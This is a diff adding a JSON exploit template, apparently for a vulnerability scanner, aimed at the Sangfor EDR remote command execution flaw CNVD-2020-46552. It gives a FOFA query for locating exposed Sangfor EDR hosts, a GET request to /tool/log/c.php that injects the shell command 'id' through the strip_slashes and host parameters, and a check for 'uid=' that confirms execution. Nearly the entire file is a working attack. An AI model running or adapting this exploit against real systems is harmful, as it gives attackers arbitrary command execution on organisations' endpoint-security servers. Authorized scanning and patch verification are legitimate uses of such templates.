@@ -1,0 +1,35 @@
+{
+  "product": "深信服EDR",
+  "vul_name": "深信服EDR 命令执行CNVD-2020-46552",
+  "type": "命令执行",
+  "vul_id": [
+    "CNVD-2020-46552"
+  ],
+  "level": 3,
+  "vul_desc": "深信服终端监测响应平台（EDR）存在远程命令执行漏洞。攻击者可通过构造HTTP请求来利用此漏洞，成功利用此漏洞的攻击者可以在目标主机上执行任意命令。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"SANGFOR-EDR\""
+  },
+  "protocol": "http",
+  "link": "https://zhuanlan.zhihu.com/p/620418212",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/tool/log/c.php?strip_slashes=system&host=id"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "uid="
+        }
+      ]
+    }
+  }
+}
